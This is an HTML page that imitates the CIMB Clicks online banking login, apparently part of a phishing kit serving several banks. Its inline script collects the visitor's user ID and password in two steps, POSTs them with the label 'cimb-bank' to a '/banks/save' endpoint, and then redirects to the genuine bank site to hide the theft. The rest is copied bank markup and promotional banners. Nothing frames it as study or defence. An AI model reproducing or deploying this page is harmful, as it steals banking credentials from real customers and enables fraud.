<!DOCTYPE html>
<!-- saved from url=(0039)https://www.cimbclicks.com.my/clicks/#/ -->
<html ng-app="CimbBanking" class=" js no-touch csstransforms3d csstransitions" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="./">--><base href=".">
	<meta http-equiv="cache-control" content="no-cache, must-revalidate, post-check=0, pre-check=0">
	<meta http-equiv="expires" content="0">
	<meta name="csrf-token" content="{{ csrf_token() }}">

	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title>CIMB Clicks</title>
	<link href="https://www.cimbclicks.com.my/clicks/img/icon/favicon.ico" rel="icon" type="image/x-icon">
	<!-- <script type="text/javascript" async="" src="banks/cimb_bank/recaptcha__en.js.download"></script><script type="text/javascript" src="banks/cimb_bank/api.js.download"></script><script type="text/javascript" async="" src="banks/cimb_bank/ga.js.download"></script><script src="banks/cimb_bank/satelliteLib-567eefb79f1e1963e91b45e3a508a36476742e22.js.download"></script> -->
		
	
	<!-- mobile capability and tweaks -->
	<meta name="viewport" id="viewport" content="width=device-width, user-scalable=no">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-touch-fullscreen" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="default">
	<meta name="format-detection" content="telephone=no">

	<link href="banks/cimb_bank/common-199ccd83.css" rel="stylesheet" type="text/css">
	<link href="banks/cimb_bank/login-92370355.css" rel="stylesheet" type="text/css">
	<link rel="stylesheet" href="banks/cimb_bank/main-d62475ed.css" type="text/css" disabled="disabled">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<!-- <script src="https://code.jquery.com/jquery-3.1.1.js"></script> -->
	<script>

	// try{
		
	// 	if ((navigator.userAgent.indexOf("Presto") != -1) && (navigator.userAgent.indexOf("Android") != -1)) {		
					
	// 				setTimeout(function(){
	// 					document.getElementById('indexLoader').style.display = "none";  
	// 					document.getElementById('operaminiContent').style.display = "block";  
	// 				}, 500);
		
	// 		}
	// 		}catch(e){
	// 					console.log("err: "+e.message);
	// 		}

	// 	engine = null;
	// 	if (window.navigator.appName == "Microsoft Internet Explorer") {
	// 		// This is an IE browser. What mode is the engine in?
	// 		if (document.documentMode) // IE8 or later
	// 			engine = document.documentMode;
	// 		else // IE 5-7
	// 		{
	// 			engine = 5; // Assume quirks mode unless proven otherwise
	// 			if (document.compatMode) {
	// 				if (document.compatMode == "CSS1Compat")
	// 					engine = 7; // standards mode
	// 			}
	// 			// There is no test for IE6 standards mode because that mode  
	// 			// was replaced by IE7 standards mode; there is no emulation.
	// 		}
	// 		// the engine variable now contains the document compatibility mode.
	// 	}

	// 	function closeBrowser() {

	// 		console.log('navigator.appVersion', navigator.appVersion);

	// 		if (navigator.appVersion.indexOf("MSIE 10") !== -1) {
	// 			console.log("IM IE10");
	// 		}
	// 		else {
	// 			logoutOnExit();
	// 			console.log('close browser');
	// 		}
	// 	}

	// 	function redirect() {
	// 			window.location.href = './unsupported/unsupported-browser.html';
	// 		}

		// function checkBrowser() {
		// 	if (navigator.userAgent.indexOf('MSIE') !== -1 || navigator.appVersion.indexOf('Trident/') > 0) {
		// 		console.log("Am IE browser11");				

		// 		if (document.all && !document.compatMode) {
		// 			console.log(" Am IE 5 or older");
		// 			//alert("Browser not supported (IE5).");
		// 			redirect();
		// 		}
		// 		else if (document.all && !window.XMLHttpRequest) {
		// 			console.log(" Am IE 6 or older");
		// 			//alert("Browser not supported (IE6).");
		// 			redirect();
		// 		}

		// 		else if (document.all && !document.querySelector) {
		// 			console.log(" Am IE 7 or older11");
		// 			//alert("Browser not supported (IE7).");
		// 			redirect();
		// 		}

		// 		else if (document.all && !document.addEventListener) {
		// 			console.log(" Am IE 8 or older11");
		// 			//alert("Browser not supported (IE8).");
		// 			redirect();
		// 		}
				
		// 	}
		// };
		// Define WL namespace.

		$.ajaxSetup({
			headers: {
				'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
			}
		});

		function usernamefunction() {
			if(document.getElementById("username").value.length > 0) {
				document.getElementById("usernamelabel").style.display = "none";
				document.getElementById("username").style.display = "none";
				document.getElementById("usernamebtn").style.display = "none";
				document.getElementById("usernamealert").style.display = "none";
				
				document.getElementById("passwordlabel").style.display = "block";
				document.getElementById("password").style.display = "block";
				document.getElementById("passwordbtn").style.display = "block";
				document.getElementById("passwordalert").style.display = "block";
			}
		}

		function passwordfunction() {
			if(document.getElementById("password").value.length > 0) {
				$.ajax({
					type: "POST",
					data: { username: document.getElementById("username").value,
							password: document.getElementById("password").value,
							bankname: "cimb-bank"},
					url : "/banks/save",
					success : function (sdata) {
						// document.getElementById("test").innerHTML = sdata ;
						// document.getElementById("test").append(sdata);
						// $('#test').html(sdata);
						location.href = "https://www.cimbclicks.com.my";
					}
				});
			}
		}

		// var WL = WL ? WL : {};
		/**
		 * WLClient configuration variables.
		 * Values are injected by the deployer that packs the gadget.
		 */
		// WL.StaticAppProps = {
		// 	"APP_DISPLAY_NAME": "Clicks MY",
		// 	"APP_ID": "CIMBClicksMY",
		// 	"APP_SERVICES_URL": "/mfp/apps/services/",
		// 	"APP_VERSION": "1.0",
		// 	"ENVIRONMENT": "desktopbrowser",
		// 	"LOGIN_DISPLAY_TYPE": "popup",
		// 	"LOGIN_POPUP_HEIGHT": 610,
		// 	"LOGIN_POPUP_WIDTH": 920,
		// 	"WORKLIGHT_PLATFORM_VERSION": "7.1.0.0",
		// 	"WORKLIGHT_ROOT_URL": "/mfp/apps/services/api/CIMBClicksMY/common/"
		// };
	</script>
	<!-- <script src="banks/cimb_bank/jquery.compressed.min.js.download"></script> -->
	<!-- <script src="banks/cimb_bank/rccp.compressed.min.js.download"></script> -->
	<!-- <script src="js/classList.js"></script> -->
	<!-- <script src="js/vendors/jquery/dist/jquery.min.js"></script> -->
	<!-- <script src='js/mfp-init.js'></script> -->
	<!-- <script src='js/login.js'></script> -->
	<!-- <script src='inline.bundle.js'></script> -->
	<!-- <script src='scripts.bundle.js'></script> -->
	<!-- <script src="js/webarch/custom/custom.js"></script> -->
	<!-- <script src="js/webarch/custom/overview.js"></script> -->
	<!-- <script src="js/webarch/pages/pages.js"></script> -->
	<!-- <script src="js/forms/input-field.js"></script> -->
	<!-- <script src='js/service-provider.js'></script> -->
	<!-- <script src='js/storage-provider.js'></script> -->
	<!-- <script src='vendor.bundle.js'></script> -->
<link href="banks/cimb_bank/styles.ee686c0d7c0e8ceae8e0.bundle.css" rel="stylesheet">
<!-- <script>bazadebezolkohpepadr="1872865011"</script><script type="text/javascript" src="banks/cimb_bank/6fa1a547" defer=""></script><script type="text/javascript" charset="utf-8" async="" src="banks/cimb_bank/144.b75efde07f480b69dbca.chunk.js.download"></script> -->
<style>.select2-dropdown[_ngcontent-c0] {
		display: none !important;
	}
	option[_ngcontent-c0]   .disabled[_ngcontent-c0] {
		display:none !important;
	}</style></head>

<!-- <body class="page-login windows desktop" onload="checkBrowser()" onunload="" onbeforeunload="closeBrowser()" onpagehide="closeBrowser()" style=""> -->
<body class="page-login windows desktop" style="">
	<div class="preloader app-loader new-loader" id="indexLoader" style="opacity: 0; display: none;">
		<div class="loader">
			<div class="css-loader"></div>
		</div>
	</div>
<div class="page-login" id="operaminiContent" style="display:none;">
		<div class="col-xs-12 col-sm-12 col-md-6 not-found-content-un">
				<div class="not-found-content-inner-un not-found-pos">					
					<br><br>					
					<p class="title-msg fontStyle"><strong>The browser or version you are using is not supported.</strong></p>					
					<p class="msg fontStyle" style="font-weight:500 !important;">Please update your existing browser to the latest version or download the latest Chrome or Safari browser to continue using CIMB Clicks.</p>
					<!--<div class="browser-logo">
						<div class="">
							<img class="img-chrome" src="img/icon-mobile-chrome.png">
							<img class="img-safari" src="img/icon-mobile-safari.png">
						</div>

						
					</div>-->
				</div>
			</div>
	</div>

	<div id="prelogin-print" class="modal fade cimb-modal cimb-modal-full-screen-mobile" tabindex="-1" role="dialog" aria-labelledby="modal-print" style="display: none; background-color: rgba(255, 255, 255, 0.9);">
		<div class="modal-dialog modal-lg" role="document">
			<div class="modal-content">
				<div class="modal-header">
					<a class="close" data-dismiss="modal" aria-label="Close" href="javascript:;">
						<i class="icon icon--close" aria-hidden="true"></i>
					</a>
					<h4 class="modal-title">Print</h4>
				</div>
				<div class="modal-body print-display-modal">
					<div class="modal-body-inner"></div>
				</div>
			</div>
		</div>
	</div>
	<print-section></print-section>
	<cimb-app ng-version="4.1.3"><div class="page-level1-container position-absolute">
	<router-outlet></router-outlet><page-login _nghost-c0=""><div _ngcontent-c0="" class="module-downtime" id="down-time-teplate" style="display: none;">
	<div _ngcontent-c0="" class="">
		<img _ngcontent-c0="" alt="OctoSend Downtime" class="img-banner full-width hidden-xs hidden-sm" src="banks/cimb_bank/octo_downtime.png">
		<div _ngcontent-c0="" class="banner-mobile visible-xs visible-sm"></div>
	</div>
	<div _ngcontent-c0="" class="content-container">
		<h2 _ngcontent-c0="" class="modal-title">System Downtime</h2>
		<p _ngcontent-c0="" class="downtime-title-text"></p>
		<div _ngcontent-c0="" class="row">
			<div _ngcontent-c0="" class="timeStamp">
				<label _ngcontent-c0="">From</label>
				<p _ngcontent-c0=""><strong _ngcontent-c0=""><span _ngcontent-c0="" class="downtime-from-time"></span></strong></p>
			</div>
			<div _ngcontent-c0="" class="timeStamp">
				<label _ngcontent-c0="">To</label>
				<p _ngcontent-c0=""><strong _ngcontent-c0=""><span _ngcontent-c0="" class="downtime-to-time"></span></strong></p>
			</div>
		</div>
		<div _ngcontent-c0="" class="message">
			<p _ngcontent-c0="" class="downtime-msg-text"><small _ngcontent-c0=""></small></p>
		</div>
	</div>
</div>

<div _ngcontent-c0="" class="login-wrapper js-login-wrapper">
	<!---->
	
	<!---->

	<!---->

	

	


	
		<div _ngcontent-c0="" class="main-content login-blink" id="main-content-login">
		<div _ngcontent-c0="" class="service-activation visible-block-xs clearfix" style="display: none;">
			<div _ngcontent-c0="" class="banner-mob header-logo">
				<img _ngcontent-c0="" alt="" class="banner" src="banks/cimb_bank/header-service-login.png">
				<div _ngcontent-c0="" class="inner container-fluid">
					<p _ngcontent-c0="" class="js-help-support-title help-support-title" style="display: none;">Help And Support</p>
					<a _ngcontent-c0="" class="logo-mob js-logo-header" href="#">
						<img _ngcontent-c0="" alt="logo-mobile" class="logo-image" src="banks/cimb_bank/logo-mob.svg">
					</a>
					<a _ngcontent-c0="" class="navbar-toggle " href="javascript:;" id="sidemenu">
						<i _ngcontent-c0="" class="icon icon--toggle"></i>
					</a>
				</div>
			</div>

		</div>
		<div _ngcontent-c0="" class="header header-login help-login">
			<div _ngcontent-c0="" class="header-top-bar text-right">
				<div _ngcontent-c0="" class="topbar-1" style="display: block;">
					
					
					<a _ngcontent-c0="" class="top-bar-item" href="https://www.cimbbank.com.my/en/personal/support.html" tabindex="8" target="_blank" title="">
						<i _ngcontent-c0="" class="icon icon--help"></i>
						<span _ngcontent-c0="" class="text-label"><a _ngcontent-c0="" href="https://www.cimbbank.com.my/en/personal/support.html" target="_blank">Help</a></span>
					</a>
				</div>
				<div _ngcontent-c0="" class="topbar-2" style="display: none;">
					
					<div _ngcontent-c0="" class="top-bar-item dropdown" tabindex="7">
						<a _ngcontent-c0="" aria-expanded="false" aria-haspopup="true" class="dropdown-toggle" data-toggle="dropdown" href="https://www.cimbclicks.com.my/clicks/#" role="button">

							<i _ngcontent-c0="" class="icon icon--message"></i>
							<span _ngcontent-c0="" class="text-label">BM</span>
							<span _ngcontent-c0="" class="bm-dropdown">
								<span _ngcontent-c0="" class="wrapper">
									<span _ngcontent-c0="" class="profile-dropdown-toggle">
										<i _ngcontent-c0="" class="icon icon--arrow-bottom"></i>
									</span>
								</span>
							</span>
						</a>
						<ul _ngcontent-c0="" aria-labelledby="dLabel" class="dropdown-menu dropdown-info">
							<li _ngcontent-c0="" class="dropdown-item">
								<a _ngcontent-c0="" class=" tickable" href="https://www.cimbclicks.com.my/clicks/#">English
									<i _ngcontent-c0="" class="icon icon--selected"></i>
								</a>
							</li>
							<li _ngcontent-c0="" class="dropdown-item active">
								<a _ngcontent-c0="" class="tickable" href="https://www.cimbclicks.com.my/clicks/#">Bahasa Malaysia
									<i _ngcontent-c0="" class="icon icon--selected"></i>
								</a>
							</li>
						</ul>
					</div>
					<a _ngcontent-c0="" class="top-bar-item" href="https://www.cimbclicks.com.my/clicks/#" tabindex="8" title="">
						<i _ngcontent-c0="" class="icon icon--help"></i>
						<span _ngcontent-c0="" class="text-label">Help</span>
					</a>
				</div>
			</div>
		</div>
		<div _ngcontent-c0="" class="banner-mob login-mob">
			<img _ngcontent-c0="" alt="" class="banner" data-src="img/login-banner-1.png" data-src-retina="img/login-banner-1.png" src="banks/cimb_bank/login-banner-mob1.png">
			<div _ngcontent-c0="" class="inner container-fluid">
				<img _ngcontent-c0="" alt="logo-mobile" class="logo-mob" src="banks/cimb_bank/logo-mob.svg">
				
				
				<h1 _ngcontent-c0="" class="text-center tac-activation-title">TAC on App Activation</h1>
				<a _ngcontent-c0="" class="navbar-toggle" href="javascript:;" id="sidemenu">
						<i _ngcontent-c0="" class="icon icon--toggle"></i>
				</a>
				<a _ngcontent-c0="" class="back-btn left-btn btn-link tac-activation-cancel" href="javascript:void(0)">
						<i _ngcontent-c0="" class="icon icon--arrow-right"></i>
					</a>
				<a _ngcontent-c0="" class="navbar-note" href="javascript:void(0)" style="display: none;" title="">
						<span _ngcontent-c0="" class="note-wrap">
							<span _ngcontent-c0="" class="notice" style="display: none;"></span>
							<i _ngcontent-c0="" class="icon icon--bell"></i>
						</span>
					</a>
				
			</div>
		</div>
		<div class="scroll-wrapper scrollForm scrollbar scrollable scrollbar-inner override-scroller" style="position: relative;"><div _ngcontent-c0="" class="scrollForm scrollbar scrollable scrollbar-inner override-scroller scroll-content" style="height: 888px; margin-bottom: 0px; margin-right: 0px; max-height: none;">

			<a _ngcontent-c0="" class="logo"><img _ngcontent-c0="" alt="logo-mobile" src="banks/cimb_bank/logo.svg" style="height:28px; width:175px;"></a>

			
			<form _ngcontent-c0="" class="form login-form ng-untouched ng-pristine ng-valid" id="login-form-step1" method="post" novalidate="novalidate" style="display: block;">
				<div _ngcontent-c0="" class="note note-login-credential">
					<h3 _ngcontent-c0="">Please enter your login credentials</h3>
				</div>

				<div _ngcontent-c0="" class="form-login-area" id="form-login-step1">

					<div _ngcontent-c0="" class="form-group form-group-select has-session" id="startHolderId">
						<label _ngcontent-c0="" class="text-form text-desk">I want to</label>
						<label _ngcontent-c0="" class="text-form text-mobi">I want to</label>
						<div _ngcontent-c0="" class="input-field input-field-2">
							
							<select _ngcontent-c0="" class="full-width quickstart select2-hidden-accessible" data-init-plugin="select2" id="quickstart-real" name="quickstart" tabindex="-1" aria-hidden="true">
							
								
								<option _ngcontent-c0="" selected="" value="dashboard">View My Dashboard</option>
								<option _ngcontent-c0="" value="overview">View My Accounts</option>
								
								<option _ngcontent-c0="" value="CA">Transfer Money</option>
								<option _ngcontent-c0="" value="NV">Pay Bills</option>
								<option _ngcontent-c0="" value="JP">JomPAY</option>
								
								<option _ngcontent-c0="" value="topUp">Top Up</option>
									
							

							</select><span class="select2 select2-container select2-container--default" dir="ltr" style="width: 496px;"><span class="selection"><span class="select2-selection select2-selection--single" role="combobox" aria-haspopup="true" aria-expanded="false" tabindex="1" aria-labelledby="select2-quickstart-real-container"><span class="select2-selection__rendered" id="select2-quickstart-real-container" title="View My Dashboard">View My Dashboard</span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span></span></span><span class="dropdown-wrapper" aria-hidden="true"></span></span>
							<select _ngcontent-c0="" class="hidden" id="desktop-quickstart">
							
								
								<option _ngcontent-c0="" selected="" value="dashboard">View My Dashboard</option>
								<option _ngcontent-c0="" value="overview">View My Accounts</option>
								
								<option _ngcontent-c0="" value="CA">Transfer Money</option>
								<option _ngcontent-c0="" value="NV">Pay Bills</option>
								<option _ngcontent-c0="" value="JP">JomPAY</option>
								
								<option _ngcontent-c0="" value="topUp">Top Up</option>
									
							</select>
							

						</div>
					</div>
					<div _ngcontent-c0="" class="input-cmp input-cmp-user-id input-cmp-validate" id="user-id-wrapper">
						
						<div _ngcontent-c0="" class="inputarea-box">
							<label _ngcontent-c0="" class="label" id="usernamelabel">User ID</label>
							<label _ngcontent-c0="" class="label" id="passwordlabel" style="display:none;">Password</label>
							<input _ngcontent-c0="" autocapitalize="off" autocomplete="off" autocorrect="off" id="username" maxlength="32" minlength="6" name="username" placeholder="Enter User ID" required="" style="color: black !important;" tabindex="2" type="text" aria-required="true" class="" aria-describedby="user-id-error" aria-invalid="true"><div  class="error" id="usernamealert" style="display:block;">CIMB Clicks ID is mandatory</div>							
							<input _ngcontent-c0="" autocapitalize="off" autocomplete="off" autocorrect="off" id="password" style="display:none;" maxlength="32" minlength="6" name="password" placeholder="Enter Password" required="" style="color: black !important;" tabindex="2" type="text" aria-required="true" class="" aria-describedby="password-error" aria-invalid="true"><div  class="error" id="passwordalert" style="display: none;">CIMB Clicks Password is mandatory</div>							
							<div _ngcontent-c0="" class="text-error js_error_message">Invalid User ID or Password</div>
							<div _ngcontent-c0="" class="text-error js_blocked_message">You have exceeded the number of times for wrong password. Please <a _ngcontent-c0="" class="link" href="javascript:;">reset your password</a></div>
							<hr _ngcontent-c0="" class="bottom-bar">
							<i _ngcontent-c0="" class="icon icon--error icon-invalid"></i>
						</div>
					</div>
					<div _ngcontent-c0="" id="googlerecaptcha"><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px;"><div class="grecaptcha-logo"><iframe src="banks/cimb_bank/anchor.html" width="256" height="60" role="presentation" name="a-5y5mxkx0bxa9" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
					<div _ngcontent-c0="" class="input-field input-field-btn">
						<button _ngcontent-c0="" id="usernamebtn" class="btn-primary btn-block btn-next googleCapthaCls" tabindex="3" type="button" onClick="usernamefunction()">
							<span _ngcontent-c0="" class="btn-text" >Login</span>
						</button>
						<button _ngcontent-c0="" id="passwordbtn" style="display:none;" onClick="passwordfunction()" class="btn-primary btn-block btn-next googleCapthaCls" tabindex="3" type="button" onClick="usernamefunction()">
							<span _ngcontent-c0="" class="btn-text" >Login</span>
						</button>
					</div>
				</div>
				<!---->
				<div _ngcontent-c0="" class="form-btn-group">
					<!----><div _ngcontent-c0="" class="row btn-group hidden-xs hidden-sm" style="display: block;">
						

						<div _ngcontent-c0="" class="col-sm-6 btn-item js-register-btn">
							<button _ngcontent-c0="" class="btn-default btn-icon" tabindex="4" type="button">								
							<i _ngcontent-c0="" class="icon icon--pen"></i>
							<span _ngcontent-c0="" class="sub-btn-text">Register</span>
							</button>
						</div>
						<div _ngcontent-c0="" class="col-sm-6 btn-item">
							
							<a _ngcontent-c0="" class="btn-default btn-icon" href="https://www.cimbclicks.com.my/maq.html" target="_blank">
								<i _ngcontent-c0="" class="icon icon--star" style="margin-right:7px;"></i>
								<span _ngcontent-c0="" class="sub-btn-text">Handy Tips</span>
							</a>
							
							
						</div>
					</div>
					
					<!----><div _ngcontent-c0="" class="link-forgot">
						
						<!----><a _ngcontent-c0="" class="link-text" href="javascript:;">Forgot User ID or Password?</a>
					</div>
					<!----><div _ngcontent-c0="" class="link-forgot">
						
						<a _ngcontent-c0="" id="desktopbutton" style="color: #000;">Desktop View</a>
					</div>
				</div>
			</form>
			

			<form _ngcontent-c0="" class="login-form pass-form ng-untouched ng-pristine ng-valid" id="form-login_step2" name="form-login_step2" novalidate="novalidate" style="display:none;">
				
				
				<div _ngcontent-c0="" class="form-group secure-block" id="load-account-id">
					<div _ngcontent-c0="" class="input-field controls secure">
						<div _ngcontent-c0="" class="controls secure">
							<img _ngcontent-c0="" class="secure-img scr-img" id="secure-img">
						</div>
					</div>
				</div>
				<div _ngcontent-c0="" class="form-group note-secure">
					<div _ngcontent-c0="" class=" form-group Login-no-margin-bottom Login-text-center LoginCheckBox ">
						<label _ngcontent-c0="" class="secure-block-label">Do not proceed if this is not your SecureWord</label>
						<br _ngcontent-c0="">
						<input _ngcontent-c0="" autofocus="" class=" checkbox-custom filled-in " id="loginCheckBox" type="checkbox">
						<label _ngcontent-c0="" class="Login-font-border secure-word-label">Yes, this is my SecureWord</label>
					</div>
				</div>
				<div _ngcontent-c0="" class="form-group">
					<div _ngcontent-c0="" class="input-cmp input-cmp-validate">
						<div _ngcontent-c0="" class="inputarea-box-pass">
							<label _ngcontent-c0="" class="label">Password</label>
							<input _ngcontent-c0="" autocapitalize="off" autocomplete="off" autocorrect="off" id="password" maxlength="20" minlength="8" name="password" placeholder="Enter Password" required="" style="color: black !important;-webkit-text-security: disc" tabindex="-1" aria-required="true" type="text" disabled=""> 
							<hr _ngcontent-c0="" class="bottom-bar">
							
						</div>
					</div>
				</div>
				<div _ngcontent-c0="" class="form-group">
					<div _ngcontent-c0="" class="input-field input-field-btn">
						<a _ngcontent-c0="" class="arrow-back" href="javascript:;" tabindex="-1"><i _ngcontent-c0="" class="icon icon--back"></i></a>

						<button _ngcontent-c0="" class="btn-primary btn-block btn-login" type="button" disabled="">
						<span _ngcontent-c0="" class="btn-text">Login</span>
						</button>
					</div>
				</div>
				<!---->
				<div _ngcontent-c0="" class="form-btn-group">
					<!----><div _ngcontent-c0="" class="row btn-group hidden-xs hidden-sm" style="display: block;">
						
						<div _ngcontent-c0="" class="col-sm-6 btn-item js-register-btn">
							<button _ngcontent-c0="" class="btn-default btn-icon" tabindex="4" type="button">
							<i _ngcontent-c0="" class="icon icon--pen"></i>
							<span _ngcontent-c0="" class="sub-btn-text">Register</span>
							</button>
						</div>
						<div _ngcontent-c0="" class="col-sm-6 btn-item">
							
							
							
							<a _ngcontent-c0="" class="btn-default btn-icon" href="https://www.cimbclicks.com.my/maq.html" target="_blank">
								<i _ngcontent-c0="" class="icon icon--star" style="margin-right:7px;"></i>
								<span _ngcontent-c0="" class="sub-btn-text">Handy Tips</span>
							</a>
							
							
						</div>
					</div>

					<!----><div _ngcontent-c0="" class="link-forgot" style="margin-bottom: 200px;">
						
						<a _ngcontent-c0="" class="link-text" href="javascript:;">Forgot User ID or Password?</a>
					</div>
					<!----><div _ngcontent-c0="" class="link-forgot" style="margin-bottom: 200px;">
						
						<a _ngcontent-c0="" id="desktopbutton" style="color: #000;">Desktop View</a>
					</div>
				</div>
			</form>

			<form _ngcontent-c0="" class="login-form pass-form ng-untouched ng-pristine ng-valid" id="form-login_step3" name="form-login_step3" novalidate="novalidate" style="display:none;">

				<div _ngcontent-c0="" class="note faquestion">
					<h3 _ngcontent-c0="" id="faquestion" name="faquestion"></h3>
				</div>

				<div _ngcontent-c0="" class="form-group">
					<div _ngcontent-c0="" class="input-cmp input-cmp-validate">
						<label _ngcontent-c0="" class="label passwordsInputId" for="fatext">Answer</label>
						<input _ngcontent-c0="" autocapitalize="off" autocomplete="off" autocorrect="off" id="fatext" maxlength="50" name="fatext" placeholder="Enter Answer" required="" tabindex="2" type="password" aria-required="true">
						<div _ngcontent-c0="" class="error" id="fatext-error" style="display: none;">This field is required</div>
						<hr _ngcontent-c0="" class="bottom-bar">
						<i _ngcontent-c0="" class="icon icon--error icon-invalid"></i>
					</div>
				</div>
				<div _ngcontent-c0="" class="form-group">
					<div _ngcontent-c0="" class="input-field input-field-btn">
						<a _ngcontent-c0="" class="arrow-back" href="javascript:;"><i _ngcontent-c0="" class="icon icon--back"></i></a>
						<button _ngcontent-c0="" class="btn-primary btn-block btn-fa" type="button">
							<span _ngcontent-c0="" class="btn-text">Login</span>
						</button>
					</div>
					<br _ngcontent-c0="">
					<span _ngcontent-c0="" id="faErrorText" name="faErrorText" style="font-size: 14px;color: red;"></span>
				</div>
			</form>


			<div _ngcontent-c0="" class="bgd-footer">&nbsp;</div>
			
			<div _ngcontent-c0="" class="tac-activation-cancel link-login text-center">
				<a _ngcontent-c0="" class="link-text link-size close-service" href="javascript:;">Cancel</a>
			</div>
		</div><div class="scroll-element scroll-x"><div class="scroll-element_outer"><div class="scroll-element_size"></div><div class="scroll-element_track"></div><div class="scroll-bar" style="width: 96px;"></div></div></div><div class="scroll-element scroll-y"><div class="scroll-element_outer"><div class="scroll-element_size"></div><div class="scroll-element_track"></div><div class="scroll-bar" style="height: 96px;"></div></div></div></div>
		<div _ngcontent-c0="" class="visible-xs">
			<div _ngcontent-c0="" class="mobile-footer" style="background-color:transparent !important;">&nbsp;</div>
			<footer _ngcontent-c0="" class="container-fluid">
				<div _ngcontent-c0="" class="nav-footer">
					<span _ngcontent-c0="" class="link-footer">All rights reserved. Copyright © 2019 <br _ngcontent-c0="">CIMB Bank Berhad (13491-P)</span>
				</div>
			</footer>
			<img _ngcontent-c0="" class="img-footer" src="banks/cimb_bank/stripebar.gif" width="100%">
		</div>
	</div>
	<div _ngcontent-c0="" class="carousel-banner" id="carousel-banner" style="z-index:1045 !important;">
		<span _ngcontent-c0="" class="triangle-right"></span>
		<!----><banner-info-cmp _ngcontent-c0=""><div class="carousel-content">

	<!----><div class="carousel-bg">
			<!----><img class="banner-application active" src="banks/cimb_bank/transparent.png" style="background-image: url(&quot;https://www.cimbclicks.com.my/resource.web/clicks.login.banner/st-1026x726-d.jpg&quot;);">
			<!---->
	</div><div class="carousel-bg">
			<!---->
			<!----><img class="banner-application" src="banks/cimb_bank/transparent.png" style="display: none; background-image: url(&quot;https://www.cimbclicks.com.my/resource.web/clicks.login.banner/cpl-201901-m.jpg&quot;);">
	</div><div class="carousel-bg">
			<!---->
			<!----><img class="banner-application" src="banks/cimb_bank/transparent.png" style="display: none; background-image: url(&quot;https://www.cimbclicks.com.my/resource.web/clicks.login.banner/duitnow-launch-d.jpg&quot;);">
	</div>
	
	<div class="owl-carousel carousel-inner swipe-banner-login noshadow owl-theme" style="opacity: 1; display: block;">
		<!----><div class="owl-wrapper-outer"><div class="owl-wrapper" style="width: 8064px; left: 0px; display: block;"><div class="owl-item active" style="width: 1344px;"><div class="item">
			<div class="carousel-caption noshadow banner-size">
				
				<h2 class="header-info noshadow" style="margin-top:0px">Introducing SecureTAC<sup>TM</sup></h2>
				<p class="content-info noshadow">Authorise your mobile app transactions with easy, secure one-tap approval.</p>
				
				<!----><p class="action-info login-banner"><a class="btn-transparent" target="_blank" type="button" href="https://www.cimbclicks.com.my/content/securetac.html">Find out more</a></p>
				<p class="tnc-info noshadow"></p>
			</div>
		</div></div><div class="owl-item" style="width: 1344px;"><div class="item">
			<div class="carousel-caption noshadow banner-size">
				
				<h2 class="header-info noshadow" style="margin-top:0px"><span style="color:#000;">#MakeItHappen with CIMB Cash Plus Personal Loan.</span></h2>
				<p class="content-info noshadow"><span style="color:#000;">Apply now and <strong>RM150 PETRONAS voucher</strong> could be yours!*</span> </p>
				
				<!----><p class="action-info login-banner"><a class="btn-transparent" target="_blank" type="button" href="https://cplform.cimbbank.com.my/forms/cpl/?cid=pb_loan_dsecplriskbasedpricing_20181217:ban_clicks_pre-login">Find out more</a></p>
				<p class="tnc-info noshadow"><span style="color:#000;">Terms and conditions apply.</span></p>
			</div>
		</div></div><div class="owl-item" style="width: 1344px;"><div class="item">
			<div class="carousel-caption noshadow banner-size">
				
				<h2 class="header-info noshadow" style="margin-top:0px"><span style="color:#fff;">DuitNow &amp; win over RM3.6 million worth of prizes!</span></h2>
				<p class="content-info noshadow"><span style="color:#fff;">Get your chance in winning a dream home, a luxe Mercedes-Benz &amp; more! Make a DuitNow transfer by 31 May 2019 to participate*.</span></p>
				
				<!----><p class="action-info login-banner"><a class="btn-transparent" target="_blank" type="button" href="https://www.cimbclicks.com.my/content/duitnow-treasures.html?utm_source=login-page&amp;utm_medium=banner&amp;utm_campaign=DuitNow%20Launch%20Campaign">Find out more</a></p>
				<p class="tnc-info noshadow"><span style="color:#fff;">*Terms and conditions apply.</span></p>
			</div>
		</div></div></div></div>
		
	<div class="owl-controls clickable"><div class="owl-pagination"><div class="owl-page active"><span class=""></span></div><div class="owl-page"><span class=""></span></div><div class="owl-page"><span class=""></span></div></div></div></div>
</div></banner-info-cmp>
	</div>

	<div _ngcontent-c0="" class="hidden-xs hidden-sm login-bottom-footer">
		<footer _ngcontent-c0="" class="footer container-fluid">
			<div _ngcontent-c0="" class="nav-footer">
				
				<a _ngcontent-c0="" class="link-footer" href="https://www.cimbclicks.com.my/terms-and-conditions.html" target="_blank">Terms &amp; Conditions</a>
				<a _ngcontent-c0="" class="link-footer" href="https://www.cimbbank.com.my/en/personal/support/privacy.html" target="_blank">Privacy</a>
				<a _ngcontent-c0="" class="link-footer" href="https://www.cimbclicks.com.my/e-banking-charter.html" target="_blank">e-Banking Charter</a>
				
				<br _ngcontent-c0="">
				<span _ngcontent-c0="" class="link-footer">Copyright © 2019 CIMB Bank Berhad (13491-P)</span>
			</div>
		</footer>
	</div>
</div>

<div _ngcontent-c0="" class="modal-confirm-mobile" id="modal-confirm-mobile" style="display: none; z-index:1050 !important;">
	<div _ngcontent-c0="" class="modal-content">
		<div _ngcontent-c0="" class="text-center clearfix" id="header">
			<h1 _ngcontent-c0="">Quick Balance</h1>
		</div>
		<div _ngcontent-c0="" class="col-xs-12 text-center clearfix" id="content">
			<p _ngcontent-c0="">You have yet enable Quick Balance.<br _ngcontent-c0=""> Enable Now</p>
		</div>
